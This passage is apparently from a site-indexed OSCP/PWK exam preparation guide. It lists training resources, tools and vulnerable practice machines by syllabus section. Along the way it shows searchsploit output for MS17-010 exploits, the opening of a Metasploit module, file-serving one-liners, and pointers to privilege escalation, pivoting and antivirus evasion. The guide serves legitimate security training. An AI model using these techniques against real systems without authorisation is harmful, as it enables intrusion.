Handbook: http://mdsec.net/wahh/ Violent Python: https://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579 Black Hat Python: https://nostarch.com/blackhatpython Courses that can help you prepare for OSCP: eLearnSecurity: eLearnSecurity offers affordable security training and a large amount of labs that you can practice in their hera lab network. They have their own certifications as well that you can take. These are the following courses that I took to help me prepare for OSCP. Penetration Testing Student (PTS): https://www.elearnsecurity.com/course/penetration_testing_student/ Penetration Testing Professional (PTP): https://www.elearnsecurity.com/course/penetration_testing/ Web Application Penetration Testing (WAPT): https://www.elearnsecurity.com/course/web_application_penetration_testing/ SANS: SANS provides a wide variety of information security courses. Each of their courses are taught by very smart instructors who have been in this field for a very long time. However, these courses can be expensive if you are unable to get someone to pay for them. You can also try to apply for the SANS workforce training as well to be able to take their courses at a discount. I have taken most of the SANS course and I feel that the following courses below really helped me get a better understanding of what Pentesting is like in the actual field. Here are the courses that I would recommend if you are looking to prepare for OSCP. SANS 560: https://www.sans.org/course/network-penetration-testing-ethical-hacking SANS 542: https://www.sans.org/course/web-app-penetration-testing-ethical-hacking Pentesterlabs: A lot of web app pentesting material in this course: https://pentesterlab.com/ Pentester Academy: https://www.pentesteracademy.com/topics Other OSCP guides: https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://411hall.github.io/OSCP-Preparation https://www.gitbook.com/book/sushant747/total-oscp-guide http://0xc0ffee.io/blog/OSCP-Goldmine https://h4ck.co/oscp-journey-exam-lab-prep-tips/ https://tulpa-security.com/2016/09/11/review-oscp-and-pwk/ http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/ Other Links: https://practicalpentestlabs.com/ https://immersivelabs.co.uk/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://maikthulhu.github.io/2017-11-20-onenote-layout Conclusion Welcome! You have arrived to the end of this journey (well not your OSCP journey if you decide to pursue it!). If you read this entire guide, I certainly give you props for doing so. If you read only parts of it, then I still give you props because the main thing that is important to me is that you learned something from it! I hope you are able to use my guide in your OSCP journey and are able to learn some new things, just like I did when I started mine. If this guide was able to help you let me know I want your feedback for sure. I thanked a lot of people for helping me with my journey in this guide and I want to thank them again for their time and contributions for helping me learn and grow in the cyber-security field. If anyone has any questions about this guide or feedback please let me know as you can reach out to me on twitter or on NetSecFocus! -TJNull Twitter: https://twitter.com/TJ_Null Github: https://github.com/tjnull Netsec Focus: Tjnull Hackthebox Discord AMA: https://www.youtube.com/watch?v=41DIav25Mp4 Bugcrowd: https://www.bugcrowd.com/researcher-spotlight-ambassador-tony-aka-tj-null/ P.S: Considering this journey as an extra mile, I am going to have to insist at this point for you to\u2026\u2026 Try Harder! -Offensive Security","title":"OSCP Prep Guide"},{"location":"oscp/#oscp_prep_guide","text":"","title":"OSCP Prep Guide"},{"location":"oscp/#the_journey_to_try_harder_tjnulls_preparation_guide_for_pwkoscp","text":"","title":"The Journey to Try Harder: TJnull\u2019s Preparation Guide for PWK/OSCP"},{"location":"oscp/#table_of_contents","text":"Overview Dedication A Word of Warning! Section 1: Getting Comfortable with Kali Linux Section 2: Essential Tools in Kali Section 3: Passive Reconnaissance Section 4: Active Reconnaissance Section 5: Vulnerability Scanning Section 6: Buffer Overflows Section 7: Handling Public Exploits Section 8: Transferring Files to your target Section 9: Privilege Escalation Section 10: Client-Side Attacks Section 11: Web Application Attacks Section 12: Password Cracking Section 13: Port Redirection and Pivoting Section 14: Metasploit Framework Section 15: Antivirus Bypassing Extra Resources Setting up your Pentesting Environment Wargames/Hands_on Challenges Capture the Flag Competitions (CTFs)/Cyber Competitions Bug Bounty Programs Vulnerable Machines Tips to participate in the Proctored OSCP exam Other Resources Conclusion","title":"Table of Contents:"},{"location":"oscp/#overview","text":"For the past 4 years of my life I had one goal: Pass OSCP on my first try. I started by reviewing the course syllabus and I realized there were some things that I did not know, which made me nervous to start the course. So, I went through a variety of resources until I thought I was ready to begin. This guide contains those resources and my advice to prepare for your adventure to take the PWK/OSCP!","title":"Overview"},{"location":"oscp/#dedication","text":"For those of you that would like to know about my journey when I took the course and exam, you can find my earlier post here: https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html A big shout out goes to abatchy! Without his guide I would have never started exploring for other resources. Thank you for creating your original guide: https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob I also want to thank the following people for taking the time to read this guide: Rey Bango Tunny Traffic aka VCSEC. A moderator at Netsec Focus G0t Mi1k The team at Offensive Security This guide has been approved by Offensive Security!","title":"Dedication"},{"location":"oscp/#a_word_of_warning","text":"Do not expect these resources to be the main thing you use for obtaining OSCP. When you are ready to take the course, you should expect the following: Spending a lot of time researching. Do not expect the admins or even other students to give you answers easily. Plan to make a commitment to this and have an open mindset to learning new things. Know your tools! There are certain tools that you cannot use for the exam. However, that does not mean you should skip over them. Take some time to understand them because you may have to use them on an actual engagement or in the field. Remember Offensive Security motto: TRY HARDER As of now Offensive Security has restricted the following tools: Commercial tools or services (Metasploit Pro, Burp Pro, etc.) Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.) Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.) Features in other tools that utilize either forbidden or restricted exam limitations Reference: https://support.offensive-security.com/oscp-exam-guide/ Most importantly: Have fun! You will learn a lot from this course, take your time to understand the material and this guide. Do not forget to take breaks and spend time away from the electronics. Trust me you do not want to burn yourself out. Course Syllabus: The 2 nd most important resource that I used to help me prepare for the course: https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf From the syllabus I will breakdown each section by providing you the resources I used to prepare for the course. Once I finish going through the syllabus, I will also be providing some extra resources that came in handy. You don\u2019t need to use this guide in order; feel free to jump around as it suits you.","title":"A Word of Warning!"},{"location":"oscp/#section_1_getting_comfortable_with_kali_linux","text":"Kali Linux Revealed and Online Course: A good foundational course that helped me understand more about Kali Linux and it has a nice Linux Fundamentals section as well. Book Link: https://kali.training/downloads/Kali-Linux-Revealed-1 st -edition.pdf Online Course Link: https://kali.training/lessons/introduction/ Bash Scripting: The bash Guide: A good guide to get you into the bash scripting https://guide.bash.academy/ Linux Journey: A huge guide to learn about a variety of different things in Linux. All the lessons are free. https://linuxjourney.com/ Explainshell: Awesome resource that parses a variety of man pages from Ubuntu Manage Repository. It breaks down the commands you are using, but it is best to refer to the man pages if you have any questions: . https://www.explainshell.com/ Hands on challenge to get comfortable with Linux: Overthewire Bandit: https://overthewire.org/wargames/bandit/ Cmdchallenge.com: https://cmdchallenge.com/ HackerRank Linux Shell: https://www.hackerrank.com/domains/shell Books: The Linux Command Line (2 nd Edition is coming soon!): https://nostarch.com/tlcl2 Linux for Hackers: https://nostarch.com/linuxbasicsforhackers","title":"Section 1: Getting Comfortable with Kali Linux"},{"location":"oscp/#section_2_essential_tools_in_kali","text":"Netcat: The TCP/IP Swiss Army tool. Experiment with this tool and understand what it does because you will be using this almost every day during the time in your course. SANS Netcat Cheatsheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: A better version of netcat in my opinion. Supports SSL communication and it is part of Nmap. TCPDump: Command line base Network Analysis Tool. Very useful and good to know if you are on a system that does not have a gui interface. Here is a good cheat sheet I used for tcpdump when I needed to troubleshoot my exploits: https://www.andreafortuna.org/technology/networking/tcpdump-a-simple-cheatsheet/ Daniel Miessler TCPDump Guide: https://danielmiessler.com/study/tcpdump/ Wireshark: GUI based Network Analysis tool. There a lot of free PCAP\u2019s samples online that you can use to understand how Wireshark works. Be careful with downloading some of these PCAP files because they may contain malware on them :D PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/","title":"Section 2: Essential Tools in Kali"},{"location":"oscp/#section_3_passive_reconnaissance","text":"Take some time to learn about these tricks and techniques. They will certainly come in handy! Google Dorks: Using various google searches that you can find that may expose sensitive information about a target. SANS Google Dork Cheatsheet: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Google Hacking Database: https://www.exploit-db.com/google-hacking-database Netcraft: https://netcraft.com/ Email Harvesting: theharvester: https://github.com/laramies/theharvester recon-ng: https://bitbucket.org/LaNMaSteR53/recon-ng/overview Additional Resources: Tools I did not use in the lab but I used them for preparation and they have come in handy for other tests. Domaintools: http://whois.domaintools.com/ MX Toolbox: https://mxtoolbox.com/DNSLookup.aspx","title":"Section 3: Passive Reconnaissance"},{"location":"oscp/#section_4_active_reconnaissance","text":"Introduction to DNS: If you do not know what DNS is or how it works, here is a great guide that I used to better understand it from Digital Ocean: https://www.digitalocean.com/community/tutorials/an-introduction-to-dns-terminology-components-and-concepts If you think you have a good understanding of what DNS is then you will also need to understand how to perform forward and reverse lookups. In addition, you should also know how zone transfers work and how to perform them. Performing these tests will certainly help you better understand what your targets are in the lab. For more information about these techniques check out this article here: https://resources.infosecinstitute.com/dns-enumeration-techniques-in-linux/#gref Tools for DNS Enumeration: Dnsrecon Created by Darkoperator: https://github.com/darkoperator/dnsrecon","title":"Section 4: Active Reconnaissance"},{"location":"oscp/#network_scanning","text":"Nmap: A tool that you should 100% totally learn about. You will probably use this everyday (If not most of the time while you are in the lab). I highly recommend you take some time to learn what the tool does, how each command switch works, each scanning technique you can run, and any other capabilities. Nmap is a powerful tool that has the ability to determine what hosts are online, what services they are running, what operating system is running on that host, and dozens of characteristics. In addition, one of the most powerful features that you should also learn is the Nmap Scripting Engine (NSE). With NSE scripts you have the ability automate a wide variety of networking tasks for your scans including vulnerability detection and exploitation. Here are my resources that I used to learn more about Nmap: Nmap Official Guide: I used this more than the man pages. I highly recommend purchasing the full book since the official guide is missing a few chapters, such as \u201cDetecting and Subverting Firewalls and Intrusion Detection Systems\u201d, \u201cOptimizing Nmap Performance\u201d, \u201cPort Scanning Techniques and Algorithms\u201d, \u201cHost Discovery (Ping Scanning)\u201d, and more. https://nmap.org/book/toc.html Link for Nmap Network Scanning Book (if you want to purchase it): https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717 SANS Nmap Cheatsheet: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Nmap Scripting Engine (NSE): https://nmap.org/book/man-nse.html ZephrFish Nmap Blog: https://blog.zsec.uk/nmap-rtfm/","title":"Network Scanning:"},{"location":"oscp/#service_enumeration","text":"There are a variety of services running on so many systems\u2026take the time to understand them! Do not just scan them and move on. Take some time to look at each of them because they could be a key for you to obtain shell access on a system! Abatchy provided a link from 0day security that gave me a lot of ideas and things to look for that I may have missed when I skipped some the of the services in the lab. You can find that resource here: http://0daysecurity.com/penetration-testing/enumeration.html Highoncoffee Penetration Testing Cheatsheet: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/","title":"Service Enumeration:"},{"location":"oscp/#section_5_vulnerability_scanning","text":"I did not spend too much time in this section for preparation because vulnerability scanners are simple and easy to configure. In addition, the purpose of a vulnerability scanner is to identify security holes in services or in a operating system. These scanners rely on a database that contains the necessary information needed to conduct a scan. A word of caution! Be careful when you use vulnerability scanners on your targets because there is a chance that some of the plugins or features can cause an impact to your target such as taking down that service, locking out user accounts, and even crash the system. In the syllabus the tool recommends that you use OpenVAS since it is a full-featured vulnerability scanner. However, there are other vulnerability scanners out there and I highly recommend playing with Nessus: https://www.tenable.com/products/nessus/nessus-professional The reason why I am stating that you should use Nessus is because it is more stable on Kali Linux and it has simple straightforward interface. I also was able to use the Nessus Home key for most of my testing and to help me get more familiar with how these vulnerability scanners work. Nessus is a real popular tool for vulnerability scanning in the infosec world and I certainly encourage you to play with it! For instructions on how to install Nessus on Kali Linux you can find it here: https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux For obtaining a Nessus key you can grab one here: https://www.tenable.com/products/nessus-home","title":"Section 5: Vulnerability Scanning"},{"location":"oscp/#section_6_buffer_overflows","text":"My favorite section to learn about! The material provided in the PWK was fantastic and really straightforward. Throughout the internet you will probably find a variety of different resources to help you understand how buffer overflows work. With that being said I will provide some of my notes and resources that helped me understand how buffer overflows. Corelan Team: A huge shout out to these guys because their articles from information security to exploit development are absolutely incredible! They have an article they posted about Stack Based Overflows that gave me a better understanding of identifying a buffer overflow in an application: Part 1: https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ Part 2: https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ Once I finished reading the articles I decided to start going through write-ups and forums where people manually identified buffer overflows in certain applications. With these walkthroughs I used Exploit-DB to check if they had the vulnerable application in many cases. I won\u2019t provide any of these walkthroughs but I will at least provide the binaries that you can use to manually identify buffer overflows. Windows Binaries (Recommend that you run these on Windows 7/XP 32 bit): Vulnserver: https://samsclass.info/127/proj/vuln-server.htm Minishare 1.4.1: https://www.exploit-db.com/exploits/636 Savant Web Server 3.1: https://www.exploit-db.com/exploits/10434 Freefloat FTP Server 1.0: https://www.exploit-db.com/exploits/40673 Core FTP Server 1.2: https://www.exploit-db.com/exploits/39480 Linux Binaries: Linux Buffer Overflow: https://samsclass.info/127/proj/lbuf1.htm Vulnerable Boxes: Brainpan 1: https://www.vulnhub.com/entry/brainpan-1,51/ Pinky\u2019s Palace version 1: https://www.vulnhub.com/entry/pinkys-palace-v1,225/ Other Resources: Whitepaper Introduction to Immunity Debugger: https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982 Buffer Overflows for Dummies: https://www.sans.org/reading-room/whitepapers/threats/buffer-overflows-dummies-481 Vortex Stack Buffer Overflow Practice: https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/ Smashing the Stack For Fun and Profit: http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf","title":"Section 6: Buffer Overflows"},{"location":"oscp/#section_7_handling_public_exploits","text":"There will come a time that you will need to use a public exploit on your target to see if you can obtain a shell on it. With that exploit you may need to modify shellcode or even parts of the exploit to match with your system to obtain a connection from your target. A word of advice: Before you download a public exploit I would consider you take some time to review the code and understand what the exploit is suppose to actually too. If you do not understand how the code works\u2026do some research!!! I am absolutely positive you can find proof of concepts online and walkthroughs that will explain how the exploit actually works. Not all exploits are going to work right out of the box you will need to configure them to make sure they can reach back to your attacking system. If you do not review the exploit code or make any modifications, then you are running risk that the exploit will fail, crash your target system/service, or it may allow other users to connect into the system. Places to find exploits: https://www.exploit-db.com/ https://packetstormsecurity.com/files/tags/exploit/ Tools for finding exploits: Searchsploit: a command line search tool for Exploit-DB that has a repo of Exploit Database with you. Command Examples: searchsploit MS-17-010 : finds all cases/exploits linked to MS17-010 1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@kali:~# searchsploit ms17-010 --------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------------------------------------------------------------- ---------------------------------------- Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution | exploits/windows/remote/43970.rb Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit) | exploits/windows/dos/41891.rb Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010) | exploits/windows_x86-64/remote/41987.py Microsoft Windows Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows/remote/42031.py Microsoft Windows Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution | exploits/windows/remote/42315.py Microsoft Windows Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows_x86-64/remote/42030.py --------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result searchsploit -x /usr/share/exploitdb/exploits/windows/remote/43970.rb : The -x command switch allows you to examine the exploit code or information about the exploit. You can also upload nmap xml files to Searchsploit so it can find available exploits that match your target. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 root @kali :~ # searchsploit -x /usr/share/exploitdb/exploits/windows/remote/43970.rb Snippet of the exploit : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## # Windows XP systems that are not part of a domain default to treating all # network logons as if they were Guest. This prevents SMB relay attacks from # gaining administrative access to these systems. This setting can be found # under: # # Local Security Settings > # Local Policies > # Security Options > # Network Access: Sharing and security model for local accounts class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: SMB :: Client :: Psexec_MS17_010 include Msf :: Exploit :: Powershell include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec include Msf :: Auxiliary :: Report def initialize ( info = {}) super ( update_info ( info , 'Name' => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution' , 'Description' => %q{ This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec payload code execution is done. Exploits a type confusion between Transaction and WriteAndX requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a named pipe. Play with some of the other command switches that Searchsploit has because it will make it much easier for you to find exploits on your kali box.","title":"Section 7: Handling Public Exploits"},{"location":"oscp/#section_8_transferring_files_to_your_target","text":"Depending on the target system you obtain access too you may not have the ability to transfer exploits or other tools you need to that system. With this being said you will need to figure out some techniques to transfer files to and from your target system. Here are a few guides I used to get a better understanding of how to transfer files onto Windows and Linux systems: Awakened: Transfer files from Kali to the target machine https://awakened1712.github.io/oscp/oscp-transfer-files/ Ropnop Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ One tool that I also found interesting to transfer files on windows systems is using bitsadmin. The tool is a command-line tool that you can use to create download or upload jobs and monitor their progress. You can find examples on how to use the tool here: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples Another tool you can check out is Impacket . This tool contains a variety of programming classes that you can use to interact with target networks to parse raw data or you can be able to use their scripts to transfer files to or from your target host. Also check out python modules like these: Python -m SimpleHTTPServer 80 : Spins up a webserver in the directory you are located on port 80. Python3 -m http.server 80 : Spins up a python version 3.X web server in the directory you are located on port 80. Python -m pyftpdlib -p 21 -w : spins up a FTP server in the directory you are located on port 21 and it allows anonymous login access. Python3 -m pyftpdlib -p 21 -w : spins up a Python 3.X FTP server in the directory you are located on port 21 and it allows anonymous login access.","title":"Section 8: Transferring Files to your target"},{"location":"oscp/#section_9_privilege_escalation","text":"In this section you will find a lot of techniques that range from getting administrative access from a kernel exploit or through a misconfigured service. The possibilities are endless, and make sure you find the ones that will work for you. In order to get an understanding of this section I recommend applying your knowledge through Vulnhub or Hackthebox to improve your skills in this area. I know there are scripts for automating this process but at some points those scripts can miss something very important on your target that you need to escalate your privileges. Something you should keep in mind :D. For this section I am going to break into two parts: Windows and Linux Privilege Escalation Techniques.","title":"Section 9: Privilege Escalation"},{"location":"oscp/#windows_privilege_escalation_guides","text":"Fuzzysecurity Windows Privilege Escalation Fundamentals: Shout out to fuzzysec for taking the time to write this because this is an amazing guide that will help you understand Privilege escalation techniques in Windows. http://www.fuzzysecurity.com/tutorials/16.html Pwnwiki Windows Privilege Escalation Commands: http://pwnwiki.io/#!privesc/windows/index.md Absolomb\u2019s Security Blog: Windows Privilege Escalation Guide https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Pentest.blog: Windows Privilege Escalation Methods for Pentesters https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"Windows Privilege Escalation Guides:"},{"location":"oscp/#windows_privilege_escalation_tools","text":"JAWS (Created by 411Hall): A cool windows enumeration script written in PowerShell. https://github.com/411Hall/JAWS/commits?author=411Hall Windows Exploit Suggester (Created by GDSSecurity): A python script that compares target patch against Microsoft vulnerability database to detect any missing patches on the target. https://github.com/GDSSecurity/Windows-Exploit-Suggester Windows Exploit Suggester Next Generation: https://github.com/bitsadmin/wesng Sherlock (Created by RastaMouse): Another cool PowerShell script that finds missing software patches for local privilege escalation techniques in Windows. https://github.com/rasta-mouse/Sherlock Other Resources for Windows Privilege Escalation Techniques: [ https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194(https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194 ) Linux Privilege Escalation Guides: The only guide I probably ever used to help me understand privilege escalation techniques in Linux systems was from g0tmi1k post. This blog is a must that everyone should have for preparing for the OSCP in my opinion. You can find his guide here: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ GTFOBins (I have to thank Ippsec for sharing this with me): Contains a curated list of Unix binaries that that have the ability to be exploited by an attacker to bypass local security restrictions on a Linux system. https://gtfobins.github.io/","title":"Windows Privilege Escalation Tools:"},{"location":"oscp/#linux_privilege_escalation_tools","text":"LinEnum: A great Linux privilege escalation checker that is still maintained by the guys at rebootuser.com. You can find there tool here: https://github.com/rebootuser/LinEnum Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2 One thing that I will mention is if you want to practice your Linux privilege escalation, I highly recommend you take a look at Lin.Security vulnerable box created by in.security! The box was designed to help people understand how certain applications and service that are misconfigured can be easily abused by an attacker. This box really helped me improved my privilege escalation skills and techniques on Linux systems. Main Link: https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/ Backup: https://www.vulnhub.com/entry/linsecurity-1,244/","title":"Linux Privilege Escalation Tools:"},{"location":"oscp/#section_10_client-side_attacks","text":"Running Client-Side Attacks usually require client interaction so it\u2019s good to have an understanding of how this works and also how you can set one up. For instance, check out the Client Side Attack Section in Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/ If you need some information on how a Client Side Attack works check out this post on nttsecurity: https://technical.nttsecurity.com/post/102ej16/what-are-client-side-attacks","title":"Section 10: Client-Side Attacks"},{"location":"oscp/#section_11_web_application_attacks","text":"This section is the one I spent most of time preparing for PWK and OSCP. In this section you need to understand the following web attacks: cross-site scripting (XSS): OWASP: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) SQL Injections: OWASP: https://www.owasp.org/index.php/SQL_Injection Pentest Monkey SQL Cheat Sheets: http://pentestmonkey.net/category/cheat-sheet/sql-injection File Inclusion Vulnerabilities. https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/","title":"Section 11: Web Application Attacks"},{"location":"oscp/#tools_for_finding_web_vulnerabilities_and_conducting_web_attacks","text":"Burp Suite: A popular web application vulnerability scanner that contains a variety of features and plugins to identify web vulnerabilities on certain web applications. The tool uses an interception proxy that connects to your browser to route traffic through the Burp Suite proxy client. Once the interception proxy is configured you can start capturing and analyzing each request to and from the target web application. With these\u2019s captured requests a penetration tester can analyze, manipulate, and fuzz individual HTTP requests in order to identify potential parameters or injection points manually. Bugcrowd University has a webinar that Jason Haddix created explaining about burp suite and how you can use it. You can find this recording here: https://www.bugcrowd.com/resource/introduction-to-burp-suite/ SQL Injection Tools: I would not recommend using these tools until you have a clear understaning about SQL Databases and how a SQL Injection works. These tools below make it easy to automate the process for conducting a SQL Injection but it is possible that they can causes issues to a targets SQL Database. Here are a list of tools that I have played with to get a better understanding of how you can automate SQL Injections: SQLmap: https://github.com/sqlmapproject/sqlmap/wiki/Usag NoSQLMap: https://github.com/codingo/NoSQLMap SQLNinja: http://sqlninja.sourceforge.net/ Nikto (Created by Chris Sullo): A web server scanner which performs comprehensive tests against web servers for multiple items. This tool can be able to scan for vulnerbalilities on the web application, checks for server configuration that include multiple index files, HTTP server options, and will attempt to identify installed the version of the web server, and any plugins/software that is running on it. Please keep this in mind that this tool is can be very noisy when scanning a targets web server. Link: https://cirt.net/Nikto2 Web Directory Scanners: These tools are designed to brute force site structure including directories and files in websites. These tools can be able to identify hidden directory scrtuctures or webpages that can come in handy when you are in the labs or during your assessment. Dirsearch: https://github.com/maurosoria/dirsearch Dirbuster: https://tools.kali.org/web-applications/dirbuster Gobuster: https://github.com/OJ/gobuster Wfuzz: https://github.com/xmendez/wfuzz","title":"Tools for finding Web Vulnerabilities and conducting Web Attacks:"},{"location":"oscp/#hands_on_areas_to_improve_your_web_attack_skills","text":"Metasploitable 2: Contains Vulnerable Web Services such as Multidae and the Damn Vulnerable Web App (DVWA) that you can use to improve your web skills. Link to download the machine: https://metasploit.help.rapid7.com/docs/metasploitable-2 Backup Link: https://www.vulnhub.com/entry/metasploitable-2,29/ Exploitability Guide: https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide OWASP Juice Shop: Another vulnerable web application that contains a variety of challenges to improve your web skills. https://www.owasp.org/index.php/OWASP_Juice_Shop_Project Overthewire Natas: A set of wargame challenges that are web base that you will need to complete in order to move to the next round. I really enjoyed their challenges when I did them! http://overthewire.org/wargames/natas/ Other resources: Hack This Site: https://www.hackthissite.org/","title":"Hands on areas to improve your web attack skills:"},{"location":"oscp/#section_12_password_cracking","text":"In this section you need to understand the basics of password attacks. Identify the differences between Windows (NTLM) hashes and Linux hashes. In addition, you will also need to understand the different tools that you can use to conduct online and offline password attacks. Here is a list of resources that I have used that helped me better understand how password cracking works: Introduction to Password Cracking: https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf","title":"Section 12: Password Cracking"},{"location":"oscp/#offline_tools_for_password_cracking","text":"Hashcat: https://hashcat.net/hashcat/ Sample Hashes to test with Hashcat: https://hashcat.net/wiki/doku.php?id=example_hashes John the Ripper: https://www.openwall.com/john/ Metasploit Unleashed using John the Ripper with Hashdump: https://www.offensive-security.com/metasploit-unleashed/john-ripper/ Online Tools for Password Cracking: THC Hydra: https://github.com/vanhauser-thc/thc-hydra Medusa: http://h.foofus.net/?page_id=51 Wordlist generators: Cewl: https://digi.ninja/projects/cewl.php Crunch: https://tools.kali.org/password-attacks/crunch Wordlists: In Kali: /usr/share/wordlists Seclists: apt-get install seclists You can find all of his password lists here: https://github.com/danielmiessler/SecLists/tree/master/Passwords","title":"Offline Tools for Password Cracking:"},{"location":"oscp/#online_password_crackers","text":"I usually went for these first to see if they had the hash cracked in their database. However, don\u2019t use these online crackers as your main tools for everything. Uploading a hash from an engagement can be a huge risk so make sure you use your offline tools to crack those types of hashes. Here is a list of online hash crackers that I found online that you can use to crack hashes: https://hashkiller.co.uk/Cracker https://www.cmd5.org/ https://www.onlinehashcrack.com/ https://gpuhash.me/ https://crackstation.net/ https://crack.sh/ https://hash.help/ https://passwordrecovery.io/ http://cracker.offensive-security.com/ Other Resources for Password Cracking: Pwning Wordpress Passwords: https://medium.com/bugbountywriteup/pwning-wordpress-passwords-2caf12216956","title":"Online Password Crackers:"},{"location":"oscp/#section_13_port_redirection_and_pivoting","text":"Depending on your scope, some of the machines may not be directly accessible. There are systems out there that are dual homed, which allow you to connect into an internal network. You will need to know some of these techniques in order to obtain access into there non-public networks: Abatchy\u2019s Port Forwarding Guide: https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide Windows Port Forwarding: http://woshub.com/port-forwarding-in-windows/ SSH Tunneling Explained: https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ Understanding Proxy Tunnels: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ Understanding Port forwarding with Metasploit: https://www.offensive-security.com/metasploit-unleashed/portfwd/ Explore Hidden Networks with Double Pivoting: https://pentest.blog/explore-hidden-networks-with-double-pivoting/ 0xdf hacks stuff. Pivoting and Tunneling: https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html Tools to help you with Port Forwarding and Pivoting: Proxychains: https://github.com/haad/proxychains Proxychains-ng: https://github.com/rofl0r/proxychains-ng SSHuttle (Totally Recommend learning this): https://github.com/sshuttle/sshuttle SSHuttle Documentation: https://sshuttle.readthedocs.io/en/stable/ Vulnerable systems to practice pivoting: Wintermute: https://www.vulnhub.com/entry/wintermute-1,239/","title":"Section 13: Port Redirection and Pivoting"},{"location":"oscp/#section_14_metasploit_framework","text":"The only guide that I used to learn more about Metasploit is Offensive Security Metasploit Unleashed course\u2026which is free! https://www.offensive-security.com/metasploit-unleashed/ Other Resources: Metasploit The Penetration Tester\u2019s Guide (A super awesome book to read): https://nostarch.com/metasploit Msfvenom Cheat Sheets: http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/ https://netsec.ws/?p=331 https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom","title":"Section 14: Metasploit Framework"},{"location":"oscp/#section_15_antivirus_bypassing","text":"I did not spend too much time learning about this section since Metasploit encodes it payloads to bypass most anti-virus (well older versions at least). The course is pretty straight forward in this section. Tools to play with Anti-Virus evasion: Veil-Framework: https://github.com/Veil-Framework/Veil","title":"Section 15: Antivirus Bypassing"},{"location":"oscp/#extra_resources","text":"This concludes the resources I have used that helped me understand the course syllabus. Now I will share with you some tips and extra resources that I used during my preparation for the PWK/OSCP.","title":"Extra Resources"},{"location":"oscp/#setting_up_your_pentesting_environment","text":"The course recommends that you are using VMware products to run the custom Kali Linux image that they have created. Windows users can purchase VMware Workstation or use their free program VMware Player . As for MAC Users you will need to use VMware Fusion . If you would like to download the custom Kali Linux System for the PWK you can find it here: https://images.offensive-security.com/pwk-kali-vm.7z Keep in mind that Offensive Security does update their images from time to time. Personally, I only used their image for completing the lab exercises and I had a separate Kali Linux image that I customized to use for the labs and exam. Another virtual machine I created was a Windows 7 32-bit system to spin up any vulnerable applications I needed to debug or to 